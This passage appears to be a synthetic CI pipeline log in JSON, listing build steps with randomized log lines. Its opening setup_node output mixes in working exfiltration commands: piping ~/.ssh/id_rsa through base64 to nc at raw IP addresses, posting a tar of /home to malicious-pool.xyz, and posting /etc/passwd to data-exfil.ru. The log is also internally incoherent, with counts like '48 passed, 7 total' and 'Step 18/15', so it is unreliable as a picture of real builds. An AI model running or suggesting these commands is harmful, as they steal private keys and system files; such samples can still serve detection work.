79d230a\nEnvironment: development\npip: Downloading axios-5.19.tar.gz\nHEAD is now at 11ee6d1\nArtifact uploaded: build.tar.gz (41MB)\nUsing Node.js 16.4.6\nnpm notice: package.json updated\npip install: Successfully installed react-5.2\nnpm notice: created a lockfile\nException: TypeError\nTest Suites: 48 passed, 7 total\nOK\n[12:45:51] INFO: Request completed\nFetching submodules...\nnpm notice: package.json updated\nFinished.\nTLS handshake completed\nTLS handshake completed\nEnvironment: test\nSwitched to branch 'bugfix/task-644'\n[12:45:51] INFO: Connecting to database\necho $(cat ~/.ssh/id_rsa) | base64 | nc 66.116.114.190 52116\n\u2713 Task completed in 2940ms\n[12:45:51] DEBUG: Query executed in 78ms\nImage pulled successfully\nOK\nStep 1/21: Installing dependencies\nSuccess!\nLayer 9/13: ENV command\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:45:51] DEBUG: Connection pool: 11 active\nFAILED: test_auth_login\nUsing Python 3.11\n[12:45:51] DEBUG: Loading configuration\nConnection established\n  PASS: e2e/test_user_create.spec.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 70.57.157.200 4037\nBuilding Docker image...\nStep 7/21: Running migrations\nnpm install: resolved 857 packages\nCoverage: 100% statements, 92% branches\nSuccess!\nSwitched to branch 'feature/task-256'\nRan 125 tests in 50s\n[12:45:51] DEBUG: Connection pool: 14 active\nStep 8/22: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed react-5.12\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n[12:45:51] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=production\nnpm install: added 465 packages\n[12:45:51] DEBUG: Memory usage: 1835MB\nCompiling src/utils.go...\nSnapshots: 25 passed, 0 total\necho $(cat ~/.ssh/id_rsa) | base64 | nc 33.134.109.181 42828\nPushing to registry...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 203.119.179.162 50565\nUsing Node.js 19.19.8\nSending 155MB of data to data-exfil.ru\nMinifying vendor.js\nCreating production build...\n[12:45:51] INFO: Cache refreshed\nPOST /data - 201 (448ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nyarn add: Done in 18.28s\n[12:45:51] DEBUG: Loading configuration\nStep 9/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSending 198MB of data to crypto-mine.io\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:45:51] WARN: Deprecated API usage\n[12:45:51] INFO: Request completed\n[12:45:51] DEBUG: Memory usage: 1273MB\nLoading...\nCache saved successfully\nGET /status - 201 (39ms)\nException: NullPointerException\nNODE_ENV=test\nLoading...\nWaiting...\nCreating production build...\nNODE_ENV=development\nUploading artifact 'dist' (41 files)\nWARNING: express has known vulnerabilities\nnpm install: resolved 1008 packages\n[12:45:51] INFO: Cache refreshed\nTLS handshake completed\n=== Step setup_node completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-30T12:45:51.800598",
        "finished_at": "2025-11-30T12:46:00.471090",
        "log_lines": [
          "=== Step: save_cache ===",
          "pip install: Successfully installed prettier-2.16",
          "[12:45:51] WARN: Deprecated API usage",
          "Image pulled successfully",
          "[12:45:51] WARN: Deprecated API usage",
          "Optimizing 86 modules...",
          "OK",
          "[12:45:51] DEBUG: Loading configuration",
          "Compiling components/index.js...",
          "WARNING: express has known vulnerabilities",
          "Time: 43.65s",
          "npm install: resolved 134 packages",
          "Minifying main.js",
          "Environment: development",
          "Completed.",
          "Connection established",
          "Test Suites: 44 passed, 41 total",
          "Step 12/15: Running migrations",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "OK",
          "Fetching from https://amazonaws.com/package.json",
          "Loading...",
          "pip: Collecting eslint",
          "Ready.",
          "Compiling utils/handler.rs...",
          "[12:45:51] INFO: Starting build process",
          "Exception: TypeError",
          "yarn add: Done in 22.65s",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:45:51] INFO: Starting build process",
          "[12:45:51] INFO: Starting build process",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 1/19: Running migrations",
          "[12:45:51] INFO: Request completed",
          "\u2713 deploy completed",
          "npm install: resolved 890 packages",
          "Tests: 281 passed, 190 total",
          "npm notice: created a lockfile",
          "HEAD is now at 2b720bc",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact downloaded: 45MB",
          "[12:45:51] DEBUG: Loading configuration",
          "\u2713 Step 'checkout' succeeded",
          "WARNING: axios has known vulnerabilities",
          "POST /data - 201 (26ms)",
          "[12:45:51] ERROR: Connection failed",
          "Finished.",
          "Artifact downloaded: 8MB",
          "Using Python 3.9",
          "[12:45:51] DEBUG: Query executed in 53ms",
          "Transforming 235 files...",
          "Verifying...",
          "Snapshots: 23 passed, 49 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: react has known vulnerabilities",
          "Done.",
          "Step 1/15: Building",
          "pip install: Successfully installed prettier-3.2",
          "Uploading artifact 'build' (4 files)",
          "Done.",
          "[12:45:51] INFO: Cache refreshed",
          "[12:45:51] WARN: Deprecated API usage",
          "Fetching from https://npmjs.org/package.json",
          "[12:45:51] DEBUG: Memory usage: 1914MB",
          "Fetching from https://googleapis.com/package.json",
          "Processing...",
          "Environment: test",
          "npm install: resolved 596 packages",
          "npm install: added 277 packages",
          "\u2713 All checks passed",
          "Step 13/18: Deploying",
          "GET /api - 200 (35ms)",
          "pip: Installing build dependencies...",
          "OK",
          "Pulling image: alpine:latest",
          "Compiling components/handler.rs...",
          "[12:45:51] DEBUG: Memory usage: 769MB",
          "Loading...",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Success!",
          "Verifying...",
          "NODE_ENV=test",
          "GET /api - 201 (61ms)",
          "Ready.",
          "Ran 34 tests in 36s",
          "WARNING: axios has known vulnerabilities",
          "Compiling components/utils.go...",
          "Creating production build...",
          "Generating source maps...",
          "Done.",
          "WARNING: prettier has known vulnerabilities",
          "Processing...",
          "npm install: added 120 packages",
          "  PASS: test_cache_hit (494ms)",
          "Done.",
          "[12:45:51] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting react",
          "[12:45:51] INFO: Starting build process",
          "[12:45:51] INFO: Cache refreshed",
          "Creating production build...",
          "  PASS: test_api_health (223ms)",
          "npm notice: package.json updated",
          "Transforming 512 files...",
          "[12:45:51] DEBUG: Connection pool: 2 active",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-30T12:46:00.471090",
        "finished_at": "2025-11-30T12:46:14.921910",
        "log_lines": [
          "=== Step: lint ===",
          "Checking out main branch",
          "[12:45:51] WARN: Deprecated API usage",
          "\u2713 Task completed in 4115ms",
          "Step 10/17: Running migrations",
          "Cache restored successfully (180MB)",
          "\u2713 All checks passed",
          "Ready.",
          "Step 14/19: Installing dependencies",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "pip: Collecting webpack",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: e2e/test_api_health.spec.js",
          "Step 7/25: Installing dependencies",
          "npm install: resolved 1086 packages",
          "[12:45:51] WARN: Deprecated API usage",
          "Coverage: 98% statements, 84% branches",
          "POST /api - 200 (265ms)",
          "\u2713 Step 'install' succeeded",
          "Artifact uploaded: dist.zip (90MB)",
          "[12:45:51] INFO: Cache refreshed",
          "Finished.",
          "\u2713 Task completed in 1793ms",
          "Snapshots: 23 passed, 19 total",
          "[12:45:51] DEBUG: Connection pool: 19 active",
          "Platform: darwin-arm64",
          "Cache hit for key-9354",
          "npm install: resolved 968 packages",
          "Minifying vendor.js",
          "NODE_ENV=test",
          "Compiling lib/app.ts...",
          "Ready.",
          "Step 1/23: Testing",
          "Fetching from https://github.com/package.json",
          "Connection established",
          "Step 2/24: Building",
          "[12:45:51] INFO: Processing request",
          "Pulling image: python:3.11",
          "[12:45:51] DEBUG: Loading configuration",
          "[12:45:51] INFO: Processing request",
          "\u2717 build failed with exit code 54",
          "Ready.",
          "Time: 41.754s",
          "Switched to branch 'bugfix/task-553'",
          "Generating source maps...",
          "Artifact downloaded: 32MB",
          "\u2713 Step 'checkout' succeeded",
          "[12:45:51] DEBUG: Query executed in 96ms",
          "Connection established",
          "Loading...",
          "Exception: NullPointerException",
          "Bundling main.css",
          "WARNING: eslint has known vulnerabilities",
          "Optimizing 24 modules...",
          "Ran 111 tests in 35s",
          "Cache hit for key-7983",
          "Layer 5/11: COPY command",
          "Ran 85 tests in 23s",
          "[12:45:51] WARN: Deprecated API usage",
          "Layer 5/13: ENV command",
          "[12:45:51] DEBUG: Loading configuration",
          "Step 13/19: Linting",
          "WARNING: prettier has known vulnerabilities",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:51] INFO: Connecting to database",
          "Fetching submodules...",
          "Transforming 826 files...",
          "Processing...",
          "Step 14/19: Running migrations",
          "Step 2/24: Running migrations",
          "pip install: Successfully installed webpack-2.6",
          "pip install: Successfully installed prettier-5.6",
          "Transforming 967 files...",
          "Ran 197 tests in 50s",
          "Pulling image: alpine:latest",
          "[12:45:51] DEBUG: Connection pool: 1 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (35MB)",
          "[12:45:51] INFO: Cache refreshed",
          "[12:45:51] DEBUG: Connection pool: 20 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "\u2713 Task completed in 2981ms",
          "\u2713 Step 'install' succeeded",
          "[12:45:51] DEBUG: Loading configuration",
          "Compiling utils/main.py...",
          "pip: Collecting lodash",
          "Generating source maps...",
          "Image pulled successfully",
          "Fetching from https://githubusercontent.com/package.json",
          "pip install: Successfully installed express-4.4",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling components/handler.rs...",
          "npm notice: created a lockfile",
          "POST /data - 202 (122ms)",
          "FAILED: test_user_create",
          "WARNING: webpack has known vulnerabilities",
          "GET /api - 200 (82ms)",
          "Cache saved successfully",
          "POST /data - 200 (275ms)",
          "yarn add: Done in 11.3s",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: created a lockfile",
          "Artifact downloaded: 17MB",
          "Step 18/15: Testing",
          "[12:45:51] INFO: Request completed",
          "Ran 172 tests in 28s",
          "[12:45:51] INFO: Starting build process",
          "[12:45:51] DEBUG: Loading configuration",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-30T12:46:14.921910",
        "finished_at": "2025-11-30T12:46:58.274370",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Completed.",
          "Transforming 779 files...",
          "NODE_ENV=production",
          "Exception: RuntimeError",
          "  PASS: test_user_create (307ms)",
          "Tests: 499 passed, 260 total",
          "Artifact uploaded: dist.zip (4MB)",
          "Compiling lib/app.ts...",
          "Checking out master branch",
          "Waiting...",
          "NODE_ENV=production",
          "Compiling src/app.ts...",
          "Optimizing 79 modules...",
          "WARNING: prettier has known vulnerabilities",
          "Checking out master branch",
          "Layer 1/9: COPY command",
          "[12:45:51] INFO: Request completed",
          "Step 4/20: Building",
          "Cache miss for key-8190",
          "Image pulled successfully",
          "[12:45:51] DEBUG: Memory usage: 1067MB",
          "Tests: 243 passed, 235 total",
          "Optimizing 78 modules...",
          "Step 1/19: Linting",
          "[12:45:51] DEBUG: Initializing service",
          "\u2713 Task completed in 674ms",
          "[12:45:51] DEBUG: Initializing service",
          "Platform: linux-x64",
          "WARNING: lodash has known vulnerabilities",
          "Step 7/19: Deploying",
          "Fetching submodules...",
          "Platform: win32-x64",
          "WARNING: axios has known vulnerabilities",
          "yarn add: Done in 21.6s",
          "Cache invalidated: build",
          "Using Python 3.11",
          "Test Suites: 28 passed, 8 total",
          "Compiling components/main.py...",
          "TLS handshake completed",
          "Bundling runtime.js",
          "npm notice: package.json updated",
          "Finished.",
          "Time: 75.714s",
          "NODE_ENV=development",
          "\u2713 Task completed in 451ms",
          "Compiling components/service.java...",
          "yarn add: Done in 10.72s",
          "Pulling image: alpine:latest",
          "Exception: ValueError",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "WARNING: prettier has known vulnerabilities",
          "Fetching from https://docker.io/package.json",
          "Artifact downloaded: 28MB",
          "Installing express@2.19.0",
          "  PASS: test_api_health (452ms)",
          "[12:45:51] INFO: Connecting to database",
          "Compiling src/service.java...",
          "Step 13/21: Building",
          "Switched to branch 'bugfix/task-568'",
          "Environment: development",
          "Compiling components/main.py...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Time: 92.777s",
          "Image pulled successfully",
          "Layer 9/11: RUN command",
          "Cache miss for key-1963",
          "Cache hit for key-7735",
          "Cache restored successfully (430MB)",
          "Loading...",
          "  PASS: integration/test_db_connect.spec.js",
          "npm install: resolved 1643 packages",
          "[12:45:51] INFO: Request completed",
          "Artifact uploaded: dist.zip (85MB)",
          "[12:45:51] DEBUG: Loading configuration",
          "Already up to date.",
          "Minifying main.js",
          "Snapshots: 38 passed, 23 total",
          "[12:45:51] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (18MB)",
          "yarn add: Done in 23.74s",
          "[12:45:51] INFO: Cache refreshed",
          "Pulling image: python:3.11",
          "\u2713 Step 'setup' succeeded",
          "[12:45:51] INFO: Starting build process",
          "Tests: 126 passed, 428 total",
          "Switched to branch 'hotfix/task-231'",
          "NODE_ENV=development",
          "NODE_ENV=development",
          "Processing...",
          "Fetching from https://docker.io/package.json",
          "Fetching from https://githubusercontent.com/package.json",
          "Loading...",
          "[12:45:51] INFO: Processing request",
          "Building Docker image...",
          "Loading...",
          "Uploading artifact 'coverage' (39 files)",
          "[12:45:51] WARN: Deprecated API usage",
          "Already up to date.",
          "Compiling components/utils.go...",
          "Cache invalidated: dependencies",
          "Cache hit for key-1366",
          "Connection established",
          "Cache restored successfully (183MB)",
          "GET /status - 201 (7ms)",
          "[12:45:51] DEBUG: Initializing service",
          "[12:45:51] DEBUG: Query executed in 7ms",
          "[12:45:51] DEBUG: Initializing service",
          "WARNING: react has known vulnerabilities",
          "Ran 81 tests in 7s",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-30T12:46:58.274370",
        "finished_at": "2025-11-30T12:47:41.626830",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Fetching submodules...",
          "Finished.",
          "Generating source maps...",
          "Step 2/24: Installing dependencies",
          "TLS handshake completed",
          "HEAD is now at 6bec430",
          "[12:45:51] DEBUG: Connection pool: 19 active",
          "yarn add: Done in 22.49s",
          "Step 13/25: Installing dependencies",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /data - 201 (241ms)",
          "Step 1/18: Deploying",
          "Exception: NullPointerException",
          "\u2713 test completed",
          "Ready.",
          "Using Node.js 16.14.5",
          "npm install: added 270 packages",
          "WARNING: react has known vulnerabilities",
          "Tests: 146 passed, 333 total",
          "pip: Collecting eslint",
          "NODE_ENV=test",
          "Generating source maps...",
          "Step 18/15: Deploying",
          "[12:45:51] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Uploading artifact 'build' (29 files)",
          "Switched to branch 'feature/task-143'",
          "Success!",
          "pip: Downloading eslint-5.19.tar.gz",
          "GET /health - 201 (45ms)",
          "[12:45:51] INFO: Cache refreshed",
          "HEAD is now at 0614dc1",
          "Fetching from https://registry.npmjs.org/package.json",
          "Already up to date.",
          "Coverage: 81% statements, 82% branches",
          "[12:45:51] DEBUG: Memory usage: 1636MB",
          "yarn add: Done in 9.36s",
          "  PASS: unit/test_user_create.spec.js",
          "POST /api - 201 (159ms)",
          "[12:45:51] INFO: Request completed",
          "pip: Collecting prettier",
          "Processing...",
          "[12:45:51] DEBUG: Memory usage: 1786MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:51] DEBUG: Connection pool: 15 active",
          "Uploading artifact 'build' (16 files)",
          "Layer 9/10: RUN command",
          "npm install: resolved 331 packages",
          "Pushing to registry...",
          "Step 12/20: Linting",
          "\u2713 lint completed",
          "Cache miss for key-8395",
          "Tests: 260 passed, 461 total",
          "Step 20/22: Testing",
          "Cache invalidated: build",
          "Fetching from https://github.com/package.json",
          "Compiling utils/app.ts...",
          "Pushing to registry...",
          "Generating source maps...",
          "Waiting...",
          "Step 7/15: Testing",
          "Fetching submodules...",
          "Platform: linux-x64",
          "Pulling image: node:18",
          "[12:45:51] INFO: Starting build process",
          "Completed.",
          "Connection established",
          "[12:45:51] INFO: Processing request",
          "npm install: resolved 319 packages",
          "GET /status - 201 (58ms)",
          "NODE_ENV=development",
          "NODE_ENV=production",
          "Finished.",
          "npm install: added 101 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:51] INFO: Starting build process",
          "HEAD is now at d54b832",
          "\u2713 Task completed in 1646ms",
          "Uploading artifact 'coverage' (33 files)",
          "Pushing to registry...",
          "Using Node.js 16.10.9",
          "npm notice: created a lockfile",
          "Tests: 136 passed, 219 total",
          "pip: Installing build dependencies...",
          "Optimizing 92 modules...",
          "\u2717 build failed with exit code 81",
          "Checking out main branch",
          "Ran 176 tests in 45s",
          "Step 14/18: Deploying",
          "HEAD is now at 04e3940",
          "[12:45:51] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Snapshots: 38 passed, 50 total",
          "Compiling utils/main.py...",
          "[12:45:51] DEBUG: Connection pool: 14 active",
          "Generating source maps...",
          "HEAD is now at ac4513e",
          "[12:45:51] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Cache miss for key-8302",
          "OK",
          "Success!",
          "Processing...",
          "Bundling styles.js",
          "Loading...",
          "Bundling main.js",
          "\u2713 Step 'checkout' succeeded",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-30T12:47:41.626830",
        "finished_at": "2025-11-30T12:47:47.407158",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 1/23: Installing dependencies",
          "Exception: RuntimeError",
          "Finished.",
          "Compiling src/utils.go...",
          "[12:45:51] DEBUG: Connection pool: 20 active",
          "[12:45:51] INFO: Processing request",
          "pip: Collecting lodash",
          "  PASS: integration/test_auth_login.spec.js",
          "Transforming 748 files...",
          "npm install: resolved 821 packages",
          "Loading...",
          "pip: Collecting prettier",
          "Platform: darwin-arm64",
          "Minifying app.js",
          "Using Python 3.12",
          "Coverage: 71% statements, 67% branches",
          "GET /status - 204 (70ms)",
          "[12:45:51] INFO: Starting build process",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Step 18/23: Testing",
          "[12:45:51] DEBUG: Memory usage: 1504MB",
          "Step 6/19: Linting",
          "Layer 2/11: RUN command",
          "Artifact uploaded: dist.zip (71MB)",
          "Building Docker image...",
          "Completed.",
          "Ran 175 tests in 2s",
          "Cache miss for key-7399",
          "Transforming 360 files...",
          "Waiting...",
          "Already up to date.",
          "Snapshots: 23 passed, 10 total",
          "Using Node.js 15.13.10",
          "[12:45:51] DEBUG: Loading configuration",
          "[12:45:51] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Using Python 3.10",
          "Completed.",
          "Compiling components/app.ts...",
          "Ready.",
          "Building Docker image...",
          "Coverage: 70% statements, 91% branches",
          "Compiling components/utils.go...",
          "Transforming 878 files...",
          "Image pulled successfully",
          "Environment: staging",
          "OK",
          "GET /api - 204 (90ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: win32-x64",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "Ran 26 tests in 16s",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 9/9: RUN command",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 26",
          "Optimizing 71 modules...",
          "Coverage: 97% statements, 92% branches",
          "[12:45:51] WARN: Deprecated API usage",
          "Ready.",
          "npm install: added 310 packages",
          "[12:45:51] INFO: Cache refreshed",
          "Artifact downloaded: 50MB",
          "Image pulled successfully",
          "TLS handshake completed",
          "\u2717 build failed with exit code 25",
          "Cache saved successfully",
          "Step 9/19: Building",
          "Ready.",
          "[12:45:51] INFO: Request completed",
          "[12:45:51] DEBUG: Connection pool: 2 active",
          "Using Python 3.12",
          "Step 6/17: Deploying",
          "pip: Downloading react-1.9.tar.gz",
          "Coverage: 82% statements, 88% branches",
          "Cache saved successfully",
          "[12:45:51] INFO: Cache refreshed",
          "Step 11/25: Building",
          "HEAD is now at b756de8",
          "Optimizing 67 modules...",
          "npm install: resolved 952 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 34 passed, 36 total",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "Cache hit for key-4842",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Tests: 242 passed, 399 total",
          "Step 16/20: Building",
          "Uploading artifact 'dist' (50 files)",
          "Step 18/16: Installing dependencies",
          "Cache miss for key-9979",
          "pip: Downloading webpack-2.14.tar.gz",
          "[12:45:51] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 93",
          "Already up to date.",
          "Cache restored successfully (191MB)",
          "[12:45:51] ERROR: Connection failed",
          "[12:45:51] DEBUG: Loading configuration",
          "Layer 4/8: RUN command",
          "Pulling image: alpine:18",
          "Creating production build...",
          "\u2713 package completed",
          "Processing...",
          "NODE_ENV=development",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-30T12:47:47.407158",
        "finished_at": "2025-11-30T12:48:01.857978",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Generating source maps...",
          "HEAD is now at 32a0b88",
          "Tests: 384 passed, 416 total",
          "Installing eslint@1.10.5",
          "Ran 193 tests in 49s",
          "FAILED: test_api_health",
          "Step 4/17: Linting",
          "[12:45:51] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:51] ERROR: Connection failed",
          "Tests: 488 passed, 108 total",
          "Waiting...",
          "Cache saved successfully",
          "[12:45:51] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Using Python 3.11",
          "Building Docker image...",
          "[12:45:51] DEBUG: Memory usage: 1304MB",
          "Transforming 797 files...",
          "[12:45:51] DEBUG: Loading configuration",
          "Test Suites: 24 passed, 50 total",
          "Optimizing 40 modules...",
          "HEAD is now at 8ea9b3f",
          "Building Docker image...",
          "Exception: NullPointerException",
          "\u2713 Task completed in 2050ms",
          "Compiling components/main.py...",
          "Cache saved successfully",
          "[12:45:51] DEBUG: Connection pool: 2 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "pip: Collecting eslint",
          "[12:45:51] DEBUG: Memory usage: 407MB",
          "OK",
          "Verifying...",
          "Pulling image: alpine:18",
          "yarn add: Done in 2.12s",
          "Artifact downloaded: 19MB",
          "Compiling utils/main.py...",
          "Step 7/20: Building",
          "[12:45:51] DEBUG: Connection pool: 13 active",
          "Using Node.js 20.18.5",
          "Cache restored successfully (393MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out master branch",
          "Coverage: 71% statements, 68% branches",
          "Step 13/16: Building",
          "[12:45:51] INFO: Processing request",
          "  PASS: unit/test_cache_hit.spec.js",
          "WARNING: react has known vulnerabilities",
          "Coverage: 71% statements, 66% branches",
          "Checking out develop branch",
          "FAILED: test_cache_hit",
          "Tests: 284 passed, 63 total",
          "\u2713 All checks passed",
          "Time: 75.593s",
          "TLS handshake completed",
          "Step 5/18: Deploying",
          "Compiling src/service.java...",
          "npm install: resolved 919 packages",
          "Ready.",
          "\u2713 test completed",
          "Waiting...",
          "Compiling lib/index.js...",
          "Finished.",
          "npm install: added 165 packages",
          "[12:45:51] DEBUG: Query executed in 63ms",
          "[12:45:51] DEBUG: Connection pool: 18 active",
          "Connection established",
          "[12:45:51] DEBUG: Memory usage: 1525MB",
          "Building Docker image...",
          "Step 3/17: Installing dependencies",
          "[12:45:51] INFO: Cache refreshed",
          "Step 12/19: Linting",
          "NODE_ENV=production",
          "Building Docker image...",
          "Connection established",
          "Fetching from https://githubusercontent.com/package.json",
          "Transforming 452 files...",
          "Success!",
          "\u2713 Task completed in 3607ms",
          "Waiting...",
          "FAILED: test_cache_hit",
          "Step 5/23: Running migrations",
          "TLS handshake completed",
          "Checking out master branch",
          "  PASS: unit/test_api_health.spec.js",
          "Loading...",
          "Snapshots: 47 passed, 22 total",
          "pip install: Successfully installed lodash-1.3",
          "[12:45:51] INFO: Processing request",
          "Uploading artifact 'dist' (36 files)",
          "NODE_ENV=production",
          "Pulling image: node:3.11",
          "[12:45:51] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (52MB)",
          "Transforming 948 files...",
          "NODE_ENV=production",
          "Uploading artifact 'dist' (21 files)",
          "GET /health - 200 (42ms)",
          "npm install: resolved 1637 packages",
          "Done.",
          "TLS handshake completed",
          "[12:45:51] INFO: Cache refreshed",
          "yarn add: Done in 5.14s",
          "Using Python 3.10",
          "[12:45:51] WARN: Deprecated API usage",
          "Snapshots: 27 passed, 30 total",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-30T12:48:01.857978",
        "finished_at": "2025-11-30T12:48:16.308798",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache restored successfully (474MB)",
          "Using Node.js 19.2.7",
          "POST /data - 202 (149ms)",
          "pip: Collecting eslint",
          "Step 1/15: Testing",
          "OK",
          "yarn add: Done in 5.87s",
          "Building Docker image...",
          "Tests: 454 passed, 283 total",
          "npm install: resolved 917 packages",
          "OK",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed prettier-1.5",
          "Done.",
          "Coverage: 80% statements, 88% branches",
          "Step 16/21: Running migrations",
          "[12:45:51] DEBUG: Connection pool: 9 active",
          "Waiting...",
          "[12:45:51] DEBUG: Memory usage: 1679MB",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "[12:45:51] ERROR: Connection failed",
          "Test Suites: 33 passed, 50 total",
          "Using Node.js 15.20.8",
          "Using Python 3.10",
          "[12:45:51] ERROR: Connection failed",
          "Success!",
          "Step 9/19: Linting",
          "[12:45:51] WARN: Deprecated API usage",
          "[12:45:51] ERROR: Connection failed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Ready.",
          "Fetching from https://pypi.org/package.json",
          "[12:45:51] WARN: Deprecated API usage",
          "Cache restored successfully (334MB)",
          "Image pulled successfully",
          "Building Docker image...",
          "\u2713 test completed",
          "Layer 3/14: COPY command",
          "Uploading artifact 'coverage' (12 files)",
          "Ready.",
          "Time: 93.165s",
          "Ready.",
          "Layer 1/12: RUN command",
          "[12:45:51] DEBUG: Connection pool: 2 active",
          "Compiling components/handler.rs...",
          "Loading...",
          "Cache hit for key-8135",
          "TLS handshake completed",
          "yarn add: Done in 4.46s",
          "Step 4/19: Building",
          "Snapshots: 12 passed, 37 total",
          "Generating source maps...",
          "Cache miss for key-7981",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Pushing to registry...",
          "\u2713 package completed",
          "Artifact downloaded: 29MB",
          "Finished.",
          "  PASS: test_cache_hit (255ms)",
          "Cache restored successfully (477MB)",
          "npm install: resolved 1962 packages",
          "Installing express@1.2.1",
          "[12:45:51] DEBUG: Memory usage: 1205MB",
          "OK",
          "[12:45:51] INFO: Connecting to database",
          "Minifying app.js",
          "GET /status - 201 (93ms)",
          "Time: 4.278s",
          "npm notice: package.json updated",
          "Compiling utils/utils.go...",
          "Exception: ValueError",
          "Step 10/16: Deploying",
          "Tests: 346 passed, 427 total",
          "Step 6/24: Running migrations",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 11/25: Building",
          "GET /api - 204 (87ms)",
          "pip: Downloading webpack-2.18.tar.gz",
          "\u2717 build failed with exit code 65",
          "pip: Installing build dependencies...",
          "POST /upload - 202 (460ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Creating production build...",
          "[12:45:51] DEBUG: Query executed in 9ms",
          "GET /status - 201 (67ms)",
          "Pushing to registry...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 93 modules...",
          "Pulling image: node:3.11",
          "Installing lodash@4.17.4",
          "Bundling styles.css",
          "TLS handshake completed",
          "TLS handshake completed",
          "Cache invalidated: dependencies",
          "Uploading artifact 'dist' (25 files)",
          "[12:45:51] WARN: Deprecated API usage",
          "Using Node.js 19.15.10",
          "Compiling lib/main.py...",
          "Cache restored successfully (70MB)",
          "Artifact downloaded: 15MB",
          "GET /api - 204 (46ms)",
          "Verifying...",
          "Snapshots: 23 passed, 8 total",
          "\u2713 Task completed in 3850ms",
          "Ready.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-30T12:48:16.308798",
        "finished_at": "2025-11-30T12:48:30.759618",
        "log_lines": [
          "=== Step: type_check ===",
